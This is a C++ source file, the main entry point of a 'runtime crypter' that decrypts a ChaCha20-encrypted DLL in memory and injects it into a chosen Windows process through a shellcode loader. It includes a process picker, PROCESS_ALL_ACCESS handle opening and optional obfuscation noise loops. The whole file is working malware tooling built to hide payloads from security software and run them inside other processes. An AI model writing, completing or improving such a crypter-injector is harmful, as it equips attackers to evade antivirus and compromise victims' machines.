// runtime_crypter/main.cpp
#include "crypter/crypter.h"
#include "injector/injector.h"
#include "loader/mapper.h"
#include "utils/logger.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <random>
#include <chrono>
#include <string>
#include <vector>
#include <iostream>

void ObfuscationNonsense() {
    volatile int dummy = 0;
    for (int i = 0; i < 10000; ++i) {
        dummy ^= i * 1337;
    }
}
//you are a nerd ngl
void PrintUsage(const char* exeName) {
    log("Usage: %s <target_pid | -l> <encrypted_dll_path> [--wait] [--obf] [--log logfile.txt]\n", exeName);
    log("  -l                 Launch interactive PID picker\n");
    log("  --wait             Wait for keypress before injection\n");
    log("  --obf              Enable obfuscation noise\n");
    log("  --log <filename>   Log output to file\n");
}

DWORD PickTargetPID() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    std::vector<PROCESSENTRY32> processes;

    if (Process32First(hSnap, &pe)) {
        do {
            processes.push_back(pe);
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);

    for (size_t i = 0; i < processes.size(); ++i) {
        wprintf(L"[%d] %ls (PID: %u)\n", (int)i, processes[i].szExeFile, processes[i].th32ProcessID);
    }

    printf("Select process index: ");
    int choice = 0;
    std::cin >> choice;
    if (choice < 0 || (size_t)choice >= processes.size()) return 0;
    return processes[choice].th32ProcessID;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        PrintUsage(argv[0]);
        return 1;
    }

    bool waitForKey = false;
    bool enableObf = false;
    const char* logFile = nullptr;
    DWORD pid = 0;
    const char* dll_path = nullptr;

    if (strcmp(argv[1], "-l") == 0) {
        pid = PickTargetPID();
        dll_path = argv[2];
    } else {
        pid = atoi(argv[1]);
        dll_path = argv[2];
    }

    for (int i = 3; i < argc; ++i) {
        if (strcmp(argv[i], "--wait") == 0) waitForKey = true;
        else if (strcmp(argv[i], "--obf") == 0) enableObf = true;
        else if (strcmp(argv[i], "--log") == 0 && i + 1 < argc) {
            logFile = argv[++i];
            set_log_file(logFile);
        }
    }

    if (pid == 0 || dll_path == nullptr) {
        PrintUsage(argv[0]);
        return 1;
    }

    if (waitForKey) {
        printf("[*] Press ENTER to continue...\n");
        getchar(); getchar();
    }

    if (enableObf) ObfuscationNonsense();

    BYTE* encrypted_data = nullptr;
    SIZE_T data_size = 0;

    if (!ReadEncryptedDLL(dll_path, &encrypted_data, &data_size)) {
        log("[-] Failed to read encrypted DLL\n");
        return 1;
    }

    BYTE* decrypted_dll = nullptr;
    SIZE_T decrypted_size = 0;

    if (!DecryptDLLChaCha20(encrypted_data, data_size, &decrypted_dll, &decrypted_size)) {
        log("[-] ChaCha20 Decryption failed\n");
        return 1;
    }

    if (enableObf) ObfuscationNonsense();

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        log("[-] Failed to open target process\n");
        return 1;
    }

    if (!InjectShellcodeStub(hProcess, decrypted_dll, decrypted_size)) {
        log("[-] Shellcode loader injection failed\n");
        CloseHandle(hProcess);
        return 1;
    }

    if (enableObf) ObfuscationNonsense();

    log("[+] ChaCha20 Encrypted DLL Injected via Shellcode Loader\n");
    CloseHandle(hProcess);
    return 0;
}
